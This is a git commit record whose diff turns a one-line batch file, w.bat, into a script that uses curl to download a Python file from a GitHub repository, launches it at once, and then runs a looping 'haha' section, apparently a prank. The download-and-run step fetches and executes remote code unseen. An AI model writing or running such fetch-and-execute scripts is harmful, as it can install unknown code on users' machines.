79bc8e58ad154efe99ac6e6b1ea6645cbf3f48f1
HOSEINLOL <ebrahimiann.hosein@gmail.com>
2024-11-04 20:11:06 +0330

    Update w.bat

--- w.bat
+++ w.bat
@@ -1,1 +1,7 @@
-echo i am gooooooooood
+@echo off 
+curl -L -o wfddddd.py https://github.com/hoseinlolready/w/raw/refs/heads/main/wfddddd.py
+start wfddddd.py
+:g
+start @echo off echo haha
+exit /b
+goto g
